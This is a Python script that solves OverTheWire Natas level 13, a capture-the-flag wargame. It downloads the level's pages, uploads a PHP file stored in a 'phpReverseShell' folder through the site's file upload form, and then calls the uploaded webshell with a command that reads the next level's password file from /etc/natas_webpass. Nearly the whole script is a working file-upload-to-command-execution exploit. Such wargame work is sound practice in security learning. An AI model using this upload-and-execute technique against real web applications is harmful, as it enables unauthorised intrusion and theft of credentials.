import requests

dirPath = 'C:\\Users\\niroj\\Documents\\Natas\\'
userName = 'natas13'
url = f'http://{userName}.natas.labs.overthewire.org/'
password = open(dirPath + 'password.txt').readlines()[12][8:40]
# print(password)

# ----------------------------- first page ---------------------------------

response = requests.get(url, auth = (userName, password))
htmlDoc = response.text

try:
    with open(dirPath + 'scripts\\temp\\index.html', 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("(+) successfully stored on the path as index.html!")
except IOError as err:
    print(f'(-) unfortunately {err}')


# ------------------------------- idex-source page -----------------------------------

response = requests.get(url + 'index-source.html', auth = (userName, password))
htmlSourceIndex = response.text

try:
    with open(dirPath + 'scripts\\temp\\index-source.html', 'w') as htmlSourceContent:
        htmlSourceContent.writelines(htmlSourceIndex)
        print("(+) successfully stored on the path as index-source.html!")
except IOError as err:
    print(f'(-) unfortunately {err}')

# -------------------------------- file upload ------------------------------------

data = {
    "filename": "ReSh.php"
}
try:
    with open(dirPath+'scripts\\phpReverseShell\\ReSh.php', 'rb') as reshFile:
        response = requests.post(url, auth = (userName, password), files = {"uploadedfile": reshFile}, data = data)
        htmlDoc = response.text

        with open(dirPath + 'scripts\\temp\\result.html', 'w') as htmlFinalContent:
            htmlFinalContent.writelines(htmlDoc)
            response = requests.get(url + 'upload/angdo163it.php?c=cat /etc/natas_webpass/natas14', auth = (userName, password))
            content = response.text
            htmlFinalContent.writelines(content)
            print("(+) successfully stored on the path as result.html!")
except IOError as err:
    print(f'(-) unfortunately {err}')